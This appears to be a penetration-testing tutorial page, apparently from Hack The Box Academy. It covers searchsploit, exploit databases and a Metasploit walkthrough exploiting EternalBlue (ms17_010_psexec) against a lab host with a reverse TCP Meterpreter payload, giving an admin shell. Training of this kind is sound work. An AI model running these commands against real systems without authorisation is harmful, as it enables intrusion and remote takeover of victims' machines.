# Public Exploits

Once we identify the services running on ports identified from our `Nmap` scan, the first step is to look if any of the applications/services have any public exploits. Public exploits can be found for web applications and other applications running on open ports, like `SSH` or `ftp`.

***

### Finding Public Exploits

Many tools can help us search for public exploits for the various applications and services we may encounter during the enumeration phase. One way is to Google for the application name with `exploit` to see if we get any results:

![](https://academy.hackthebox.com/storage/modules/77/google\_smb.jpg)

A well-known tool for this purpose is `searchsploit`, which we can use to search for public vulnerabilities/exploits for any application. We can install it with the following command:

Public Exploits

```shell-session
AIceBear@htb[/htb]$ sudo apt install exploitdb -y
```

Then, we can use `searchsploit` to search for a specific application by its name, as follows:

Public Exploits

```shell-session
AIceBear@htb[/htb]$ searchsploit openssh 7.2

----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

We can also utilize online exploit databases to search for vulnerabilities, like [Exploit DB](https://www.exploit-db.com), [Rapid7 DB](https://www.rapid7.com/db/), or [Vulnerability Lab](https://www.vulnerability-lab.com). The [Intro to Web Applications](https://academy.hackthebox.com/module/details/75) module discusses public vulnerabilities for web applications.

### Metasploit Primer

The Metasploit Framework (MSF) is an excellent tool for pentesters. It contains many built-in exploits for many public vulnerabilities and provides an easy way to use these exploits against vulnerable targets. MSF has many other features, like:

* Running reconnaissance scripts to enumerate remote hosts and compromised targets
* Verification scripts to test the existence of a vulnerability without actually compromising the target
* Meterpreter, which is a great tool to connect to shells and run commands on the compromised targets
* Many post-exploitation and pivoting tools

Let us take a basic example of searching for an exploit for an application we are attacking and how to exploit it. To run `Metasploit`, we can use the `msfconsole` command:

Public Exploits

```shell-session
AIceBear@htb[/htb]$ msfconsole


      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.

               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.0.16-dev                          ]
+ -- --=[ 2074 exploits - 1124 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]
```

Once we have `Metasploit` running, we can search for our target application with the `search exploit` command. For example, we can search for the SMB vulnerability we identified previously:

Public Exploits

```shell-session
msf6 > search exploit eternalblue

Tip: Search can apply complex filters such as search cve:2009 type:exploit. See all the filters with help search

We found one exploit for this service. We can use it by copying the full name of it and using `USE` to use it:

Public Exploits

```shell-session
msf6 > use exploit/windows/smb/ms17_010_psexec

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

Before we can run the exploit, we need to configure its options. To view the options available to configure, we can use the `show options` command:

```shell-session

...SNIP...
```

Any option with `Required` set to `yes` needs to be set for the exploit to work. In this case, we only have two options to set: `RHOSTS`, which means the IP of our target (this can be one IP, multiple IPs, or a file containing a list of IPs). We can set them with the `set` command:

Public Exploits

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

Once we have both options set, we can start the exploitation. However, before we run the script, we can run a check to ensure the server is vulnerable:

Public Exploits

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > check

[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
```

As we can see, the server is indeed vulnerable. Note that not every exploit in the `Metasploit Framework` supports the `check` function. Finally, we can use the `run` or `exploit` command to run the exploit:

Public Exploits

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.2:4444

As we can see, we have been able to gain admin access to the box and used the `shell` command to drop us into an interactive shell. These are basic examples of using `Metasploit` to exploit a vulnerability on a remote server. There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but not limited to:

* Granny/Grandpa
* Jerry
* Blue
* Lame
* Optimum
* Legacy
* Devel

Later on, in this module, we will walk through the `Nibbles` box step-by-step and then show exploitation using `Metasploit`. `Metasploit` is another essential tool to add to our toolkit, but it is crucial not solely to rely on it. To be well-rounded testers, we must know how to best leverage all of the tools available to us, understand why they sometimes fail, and know when to pivot to manual techniques or other tools.
